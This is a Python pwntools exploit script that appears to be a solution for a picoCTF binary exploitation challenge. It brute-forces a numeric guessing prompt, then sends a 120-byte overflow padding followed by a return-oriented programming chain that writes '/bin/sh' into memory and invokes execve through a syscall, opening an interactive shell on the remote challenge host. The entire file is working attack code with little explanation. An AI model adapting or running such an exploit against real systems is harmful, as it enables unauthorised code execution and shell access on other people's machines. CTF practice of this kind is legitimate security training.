#!/usr/bin/env python3

from os import write
from pwn import log, process, remote, context
from pwnlib import context
from pwnlib.util.packing import p64, u64

def bruteforce(p : remote):
    for i in range (10000000):
        response = p.recvuntil(b'?')
        # log.info(f'{response=}')
        i = str(i)
        log.info(f'{i=}')
        p.sendline(i)

        response = p.recvline()
        # log.info(f'{response=}')
        response = p.recvline()
        # log.info(f'{response=}')  
        
        if response.__contains__(b'Congrats!'):
            break


def main():
    context.loglevel = 'debug'
    # p = process('./vuln')
    p = remote('jupiter.challenges.picoctf.org', 51462)

    padding = b'A'*120

    bruteforce(p) 
  
    exploit = padding
    exploit += p64(0x4163f4) # pop rax ; ret
    exploit += b'/bin/sh\x00'
    exploit += p64(0x410ca3) # pop rsi ; ret
    exploit += p64(0x6ba0e0) # @ .data + 8
    exploit += p64(0x47ff91) # mov qword ptr [rsi], rax ; ret

    exploit += p64(0x400696) # pop rdi ; ret
    exploit += p64(0x6ba0e0) # @ .data
    exploit += p64(0x410ca3) # pop rsi ; ret
    exploit += p64(0x000000) # argv
    exploit += p64(0x44a6b5) # pop rdx ; ret
    exploit += p64(0x000000) # envp
    exploit += p64(0x4163f4) # pop rax; ret
    exploit += p64(0x3b) # sys_execve
    exploit += p64(0x40137c) # syscall    

    p.sendlineafter('Name?', exploit)
    
    p.interactive()

if __name__ == '__main__':
    main()
